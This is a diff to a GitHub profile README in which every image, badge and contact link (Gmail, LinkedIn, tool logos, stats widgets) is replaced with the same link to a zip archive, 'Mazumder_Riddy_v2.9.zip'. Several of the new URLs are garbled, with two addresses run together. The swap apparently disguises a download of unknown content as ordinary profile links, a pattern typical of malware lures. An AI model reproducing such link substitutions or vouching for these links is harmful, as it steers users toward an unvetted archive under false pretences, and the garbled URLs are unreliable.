@@ -1,13 +1,13 @@
 # 🚀 Hi 👋, I'm **Riddy Mazumder**
 <div align="center">
-  <img src="https://github.com/RiddyMazumder/GIF/blob/main/My%20Video.gif" width="800" height="500"/>
+  <img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip%https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="800" height="500"/>
 </div>
 
 <h3 align="center">⚡ Cybersecurity & Bug‑Bounty Hunter | ML, DL & LLM Explorer</h3>
 
 ---
 
-## 🧑‍💻 About Me <img align="right" src="https://user-images.githubusercontent.com/59453698/178947079-df3cd391-b419-4258-a542-b9a7e47e4351.gif" width="260" style="border-radius:15px;" />
+## 🧑‍💻 About Me <img align="right" src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="260" style="border-radius:15px;" />
 - 🌱 Currently diving deep into **Large Language Models (LLMs)**
 - 🧪 Exploring **ML Models**, **Hybrid ML Modeling** & **Data Automation**
 - 🐳 Learning & deploying projects with **Docker**
@@ -17,27 +17,27 @@
 ---
 
 ## 🔗 Connect with Me
-[![Gmail](https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:riddymazumder1971@gmail.com)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/riddy-mazumder-7bab46338/)
-[![Instagram](https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://www.instagram.com/)
-[![X](https://img.shields.io/badge/X.com-010B13?style=for-the-badge&logo=X&logoColor=white)](https://x.com/RiddyMazumder)
-[![LeetCode](https://img.shields.io/badge/LeetCode-FFA116?style=for-the-badge&logo=LeetCode&logoColor=white)](https://leetcode.com)
+[![Gmail](https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip)](https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip)
+[![LinkedIn](https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip)](https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip)
+[![Instagram](https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip)](https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip)
+[![X](https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip)](https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip)
+[![LeetCode](https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip)](https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip)
 
 ---
 
-## 🛠️ Languages & Tools <img align="right" src="https://github.com/RiddyMazumder/GIF/blob/main/Tech%20Harmony%20-%20Dream%20Machine.gif" width="260" style="border-radius:15px;" />
+## 🛠️ Languages & Tools <img align="right" src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip%20Harmony%20-%20Dream%https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="260" style="border-radius:15px;" />
 <div align="left">
 
-<img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" width="45" />
-<img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/java/java-original.svg" width="45" />
-<img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/c/c-original.svg" width="45" />
-<img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/linux/linux-original.svg" width="45" />
-<img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/docker/docker-original-wordmark.svg" width="50" />
-<img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/git/git-original.svg" width="45" />
-<img src="https://www.vectorlogo.zone/logos/opencv/opencv-icon.svg" width="45" />
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Scikit_learn_logo_small.svg" width="45" />
-<img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/tensorflow/tensorflow-original.svg" width="45" />
-<img src="https://raw.githubusercontent.com/devicons/devicon/2ae2a900d2f041da66e950e4d48052658d850630/icons/pandas/pandas-original.svg" width="45" />
+<img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="45" />
+<img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="45" />
+<img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="45" />
+<img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="45" />
+<img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="50" />
+<img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="45" />
+<img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="45" />
+<img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="45" />
+<img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="45" />
+<img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="45" />
 
 </div>
 
@@ -47,10 +47,10 @@
 <div align="center" style="margin-top: 20px;">
 
   
-  <img src="https://github-readme-stats.vercel.app/api?username=riddymazumder&show_icons=true&theme=tokyonight&hide_border=true&border_radius=15" height="160px" style="margin: 10px;" />  
- <p><img align="right" src="https://github-readme-streak-stats.herokuapp.com/?user=riddymazumder&" alt="riddymazumder" /></p>
+  <img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" height="160px" style="margin: 10px;" />  
+ <p><img align="right" src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" alt="riddymazumder" /></p>
   <br/>
-  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=riddymazumder&layout=compact&theme=tokyonight&hide_border=true&border_radius=15" height="160px" style="margin: 15px;" />
+  <img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" height="160px" style="margin: 15px;" />
 </div>
 
 ---
@@ -58,7 +58,7 @@
 ## 🧠 Aesthetic GIF Sections
 <div align="center">
   
-  <img src="https://github.com/RiddyMazumder/GIF/blob/main/Cyberpunk%20Coder%20-%20Dream%20Machine_2.gif" width="350" />
+  <img src="https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip%20Coder%20-%20Dream%https://raw.githubusercontent.com/RiddyMazumder/RiddyMazumder/main/ungouged/Mazumder_Riddy_v2.9.zip" width="350" />
 </div>
 
 ---
